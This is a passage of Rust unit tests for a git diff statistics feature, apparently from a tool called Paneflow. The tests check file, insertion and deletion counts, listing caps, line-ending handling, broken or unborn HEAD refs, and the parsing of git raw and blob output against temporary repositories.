        let stats = GitDiffStats::from_cwd(dir.path().to_str().unwrap());
        assert!(
            stats.is_empty(),
            "non-repo should yield no stats, got {stats:?}"
        );
    }

    #[test]
    fn from_cwd_counts_staged_and_untracked_changes() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        fixture::init(root);
        fixture::run(root, &["config", "core.autocrlf", "false"]);
        std::fs::write(root.join("tracked.txt"), "one\n").unwrap();
        fixture::run(root, &["add", "tracked.txt"]);
        fixture::run(
            root,
            &[
                "-c",
                "user.email=paneflow@example.com",
                "-c",
                "user.name=Paneflow",
                "commit",
                "-m",
                "init",
            ],
        );

        std::fs::write(root.join("tracked.txt"), "one\ntwo\n").unwrap();
        fixture::run(root, &["add", "tracked.txt"]);
        std::fs::write(root.join("untracked.txt"), "alpha\nbeta\n").unwrap();

        let stats = GitDiffStats::from_cwd(root.to_str().unwrap());
        assert_eq!(stats.files_changed, 2);
        assert_eq!(stats.insertions, 3);
        assert_eq!(stats.deletions, 0);
    }

    fn commit_all(root: &std::path::Path, message: &str) {
        fixture::commit_all(root, message);
    }

    #[test]
    fn untracked_files_past_the_cap_show_the_cap_and_a_plus() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        fixture::init(root);
        std::fs::write(root.join("seed.txt"), "seed\n").unwrap();
        commit_all(root, "seed");
        for i in 0..1005 {
            std::fs::write(root.join(format!("u{i:04}.txt")), "").unwrap();
        }
        let stats = GitDiffStats::from_cwd(root.to_str().unwrap());
        assert_eq!(stats.files_changed, GIT_DIFF_STAT_UNTRACKED_PATH_CAP);
        assert!(stats.count_capped);
        assert_eq!(stats.files_changed_label(), "1000+ files");
    }

    #[test]
    fn an_untracked_listing_past_the_byte_cap_still_counts_what_it_read() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        fixture::init(root);
        std::fs::write(root.join("seed.txt"), "seed\n").unwrap();
        commit_all(root, "seed");
        let long = "n".repeat(200);
        for bucket in 0..8 {
            let dir = root.join(format!("{long}{bucket}"));
            std::fs::create_dir_all(&dir).unwrap();
            for i in 0..250 {
                std::fs::write(dir.join(format!("{long}{i:03}")), "").unwrap();
            }
        }
        let stats = GitDiffStats::from_cwd(root.to_str().unwrap());
        assert!(stats.count_capped, "{stats:?}");
        assert!(!stats.unavailable);
        assert!(stats.files_changed > 0, "a byte cap never reads as 0 files");
        assert!(stats.files_changed <= GIT_DIFF_STAT_UNTRACKED_PATH_CAP);
    }

    #[test]
    fn a_subfolder_workspace_counts_the_untracked_files_of_the_whole_repository() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        fixture::init(root);
        std::fs::create_dir_all(root.join("sub")).unwrap();
        std::fs::write(root.join("sub").join("kept.txt"), "k\n").unwrap();
        commit_all(root, "seed");
        std::fs::write(root.join("top.txt"), "a\nb\n").unwrap();
        std::fs::write(root.join("sub").join("inner.txt"), "c\n").unwrap();
        let stats = GitDiffStats::from_cwd(root.join("sub").to_str().unwrap());
        assert_eq!((stats.files_changed, stats.insertions), (2, 3));
    }

    #[test]
    fn an_unreadable_head_is_an_error_and_an_unborn_branch_is_the_empty_tree() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        fixture::init(root);
        std::fs::write(root.join("new.txt"), "x\n").unwrap();
        assert_eq!(resolve_head(root, GIT_DIFF_STAT_DEADLINE), Ok(None));
        let unborn = GitDiffStats::from_cwd(root.to_str().unwrap());
        assert!(!unborn.unavailable);
        assert_eq!(unborn.files_changed, 1);

        commit_all(root, "first");
        let branch = fixture::run(root, &["symbolic-ref", "--short", "HEAD"]);
        let head_ref = root
            .join(".git")
            .join("refs")
            .join("heads")
            .join(branch.trim());
        std::fs::write(&head_ref, "not-a-sha\n").unwrap();
        assert!(resolve_head(root, GIT_DIFF_STAT_DEADLINE).is_err());
        let broken = GitDiffStats::from_cwd(root.to_str().unwrap());
        assert!(
            broken.unavailable,
            "a broken HEAD is never shown as 0 files"
        );
    }

    #[test]
    fn a_reftable_repository_shows_its_real_branch() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let init = fixture::output(
            root,
            &["init", "-q", "--ref-format=reftable", "-b", "trunk"],
        );
        if !init.status.success() {
            let stderr = String::from_utf8_lossy(&init.stderr);
            assert!(
                stderr.contains("ref-format") || stderr.contains("reftable"),
                "git init failed for a reason other than missing reftable support: {stderr}"
            );
            return;
        }
        let git_dir = root.join(".git");
        assert_eq!(
            parse_head(&git_dir).0,
            "",
            "the placeholder is never displayed"
        );
        assert_eq!(
            detect_branch(root.to_str().unwrap()),
            ("trunk".to_string(), true)
        );
    }

    #[test]
    fn the_badge_probes_share_one_deadline() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        fixture::init(root);
        std::fs::write(root.join("untracked.txt"), "a\n").unwrap();
        let started = std::time::Instant::now();
        let stats = GitDiffStats::from_cwd_until(root.to_str().unwrap(), started);
        assert!(
            started.elapsed() < std::time::Duration::from_millis(500),
            "no probe may start once the shared deadline has passed"
        );
        assert!(stats.is_empty());
        assert_eq!(
            GitDiffStats::from_cwd(root.to_str().unwrap()).files_changed,
            1
        );
    }

    fn git_shortstat(root: &std::path::Path) -> (usize, usize, usize) {
        let out = fixture::run(root, &["diff", "--shortstat", "HEAD", "--"]);
        let mut counts = (0, 0, 0);
        for part in out.split(',') {
            let number = part
                .split_whitespace()
                .next()
                .and_then(|n| n.parse().ok())
                .unwrap_or(0);
            if part.contains("file") {
                counts.0 = number;
            } else if part.contains("insertion") {
                counts.1 = number;
            } else if part.contains("deletion") {
                counts.2 = number;
            }
        }
        counts
    }

    fn make_stat_dirty(path: &std::path::Path) {
        std::fs::File::options()
            .write(true)
            .open(path)
            .unwrap()
            .set_modified(std::time::SystemTime::now() + std::time::Duration::from_secs(120))
            .unwrap();
    }

    fn counts(stats: &GitDiffStats) -> (usize, usize, usize) {
        (stats.files_changed, stats.insertions, stats.deletions)
    }

    #[test]
    fn tracked_counts_match_git_shortstat_for_every_kind_of_change() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        fixture::committed_repo(
            root,
            &[
                ("edit.txt", "a\nb\nc\n"),
                ("gone.txt", "x\ny\n"),
                ("touched.txt", "same\n"),
                ("blob.dat", "\0\u{1}\u{2}"),
                ("staged.txt", "one\n"),
                ("tail.txt", "no newline"),
                ("sub/deep.txt", "1\n2\n3\n4\n"),
            ],
        );
        std::fs::write(root.join("edit.txt"), "a\nB\nc\nd\n").unwrap();
        std::fs::remove_file(root.join("gone.txt")).unwrap();
        make_stat_dirty(&root.join("touched.txt"));
        std::fs::write(root.join("blob.dat"), "\0\u{1}\u{3}\u{4}").unwrap();
        std::fs::write(root.join("staged.txt"), "one\ntwo\n").unwrap();
        fixture::run(root, &["add", "staged.txt"]);
        std::fs::write(root.join("staged.txt"), "one\ntwo\nthree\n").unwrap();
        std::fs::write(root.join("tail.txt"), "no newline\nnow two").unwrap();
        std::fs::write(root.join("sub").join("deep.txt"), "1\n3\n").unwrap();
        std::fs::write(root.join("added.txt"), "n1\nn2\n").unwrap();
        fixture::run(root, &["add", "added.txt"]);

        let stats = GitDiffStats::from_cwd(root.join("sub").to_str().unwrap());
        assert!(!stats.unavailable);
        assert_eq!(counts(&stats), git_shortstat(root));
        assert_eq!(counts(&stats), (7, 8, 6));
    }

    #[test]
    fn an_autocrlf_checkout_counts_line_endings_like_git() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        fixture::init(root);
        fixture::run(root, &["config", "core.autocrlf", "true"]);
        std::fs::write(root.join("untouched.txt"), "a\r\nb\r\n").unwrap();
        std::fs::write(root.join("edited.txt"), "a\r\nb\r\n").unwrap();
        commit_all(root, "crlf");
        make_stat_dirty(&root.join("untouched.txt"));
        std::fs::write(root.join("edited.txt"), "a\r\nB\r\n").unwrap();

        let stats = GitDiffStats::from_cwd(root.to_str().unwrap());
        assert_eq!(counts(&stats), git_shortstat(root));
        assert_eq!(counts(&stats), (1, 1, 1));
    }

    #[test]
    fn an_added_file_counts_the_same_lines_staged_or_untracked() {
        for text in ["", "a", "a\n", "a\nb", "a\n\n", "\n", "a\r\nb\r\n"] {
            let SideText::Text(normalized) = stat_text(text.as_bytes().to_vec()) else {
                panic!("{text:?} is text");
            };
            assert_eq!(
                git_line_counts(String::new(), normalized.clone()),
                (text_line_count(&normalized) as u32, 0),
                "{text:?}"
            );
        }
    }

    #[test]
    fn only_a_nul_in_the_first_eight_thousand_bytes_makes_a_side_binary() {
        assert_eq!(stat_text(b"a\0b".to_vec()), SideText::Binary);
        let mut late_nul = vec![b'a'; GIT_BINARY_SNIFF_BYTES];
        late_nul.push(0);
        assert!(matches!(stat_text(late_nul), SideText::Text(_)));
        assert_eq!(
            stat_text(b"caf\xe9\r\n".to_vec()),
            SideText::Text("caf\u{fffd}\n".to_string())
        );
    }

    #[test]
    fn a_truncated_raw_listing_keeps_only_its_complete_records() {
        let oid = "1".repeat(40);
        let null = "0".repeat(40);
        let raw = format!(
            ":100644 100644 {oid} {null} M\0a.txt\0:100644 100644 {oid} {oid} R087\0old.txt\0new.txt\0:100644 000000 {oid} {null} D\0cut-off"
        );
        let all = parse_raw_changes(raw.as_bytes(), false);
        assert_eq!(all.len(), 3);
        assert_eq!(all[1].path, b"new.txt");
        assert_eq!(all[2].status, b'D');
        let complete = parse_raw_changes(raw.as_bytes(), true);
        assert_eq!(
            complete
                .iter()
                .map(|change| change.path.as_slice())
                .collect::<Vec<_>>(),
            vec![b"a.txt".as_slice(), b"new.txt".as_slice()]
        );
    }

    #[test]
    fn a_blob_batch_reports_missing_large_and_cut_off_objects() {
        let small = "1".repeat(40);
        let missing = "2".repeat(40);
        let large = "3".repeat(40);
        let cut = "4".repeat(40);
        let big_size = GIT_DIFF_STAT_FILE_BYTES_CAP as usize + 1;
        let mut batch =
            format!("{small} blob 3\nx\r\n\n{missing} missing\n{large} blob {big_size}\n")
                .into_bytes();
        batch.extend(std::iter::repeat_n(b'z', big_size));
        batch.extend_from_slice(format!("\n{cut} blob 10\nshort").as_bytes());

        let blobs = parse_blob_batch(&batch);
        assert_eq!(blobs[&small], SideText::Text("x\n".to_string()));
        assert_eq!(blobs[&missing], SideText::Unreadable);
        assert_eq!(blobs[&large], SideText::TooLarge);
        assert!(!blobs.contains_key(&cut));
    }

    #[test]
    fn a_tracked_listing_past_its_byte_cap_is_shown_as_a_lower_bound() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        fixture::init(root);
        let long = "t".repeat(116);
        let names: Vec<String> = (0..1300).map(|i| format!("{long}{i:04}")).collect();
        for name in &names {
            std::fs::write(root.join(name), "a\n").unwrap();
        }
        commit_all(root, "seed");
        for name in &names {
            std::fs::write(root.join(name), "b\n").unwrap();
        }
        let stats = GitDiffStats::from_cwd(root.to_str().unwrap());
        assert!(!stats.unavailable);
        assert!(stats.count_capped, "{stats:?}");
        assert!(stats.files_changed > 0 && stats.files_changed < names.len());
        assert!(stats.files_changed_label().ends_with("+ files"));
    }
}
